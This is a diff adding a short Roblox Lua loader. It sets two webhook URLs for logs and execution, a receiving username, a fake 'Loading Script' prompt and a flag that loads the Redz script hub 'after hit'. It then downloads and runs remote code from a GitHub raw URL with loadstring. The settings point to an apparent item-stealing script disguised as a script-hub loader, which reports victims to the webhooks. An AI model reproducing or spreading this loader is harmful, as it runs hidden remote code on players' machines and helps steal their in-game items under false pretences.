@@ -1,0 +1,8 @@
+LogsWebhook = "https://webhook-protect.vercel.app/api/webhook?id=MDNxZG51QndDLUJfSWRQT1R1UTRSZzozaThGX3VmdXhEZTk0ZmpfNGwyeVg5NnRPZVBCd1lKZEhONmY0clN5VElvVWgxUWNVU2FoTUhUYlhBaWpxdjN0NEI2bmxMakhBVTJjYzRISnVsSXVyUTF2eDhOcnN6cExZNDU0eDJPbmo4OENRS2taMzVpQjRXbmhveEtycEFzaEQ1ei1jTEl5bTdhRkpPQmdZSUc4NERtYWJaWDJUbjlZMXQwaFpLM2o0bjg"
+ExecutionWebhook = "https://webhook-protect.vercel.app/api/webhook?id=aFJ5TEEwemZmeGw3Z19QOXlralZpdzp2Z3FCUjZDSnlzR2VWSEI2NG8yaGZJeHZWQ0l5WHVJb2daaVJYSzd5R3J2bTRkbnEweHRCb2NSdmZNcVNyT3VTNVBGRldxQzZxTnN0R2EyMVZRRWl5WmNiUEh3Q2t3TWUtcms0NlJ0Qm5GUmxpYkNuNXQwclRsRERMbnBVRGF0R09FRExSak5Qb0JpbWxPVUhiRDgtNXpzNzc0WFJITTFZR3V4UUtEQ0E5VlE"
+Username = "ToxicVortex0"
+PromptText = "Loading Script"
+RandomizedPrompt = true
+LoadRedzAfterHit = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))()
